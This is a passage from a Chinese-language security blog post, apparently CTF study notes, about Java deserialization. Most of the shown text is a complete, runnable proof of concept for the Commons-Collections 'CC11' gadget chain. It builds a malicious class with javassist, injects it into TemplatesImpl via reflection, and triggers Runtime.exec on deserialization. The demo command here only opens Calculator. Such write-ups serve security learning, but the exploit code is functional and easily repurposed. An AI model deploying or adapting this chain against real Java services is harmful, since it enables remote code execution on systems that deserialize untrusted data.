class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用javasist动态创建恶意字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>具体分析参考：<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p>
<h1 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h1><p>反弹shell解惑：</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/反序列化/" class="tag">#反序列化</a><a href="/tags/CC链/" class="tag">#CC链</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Node.Js安全分析</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">PHP GC回收机制及其利用</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>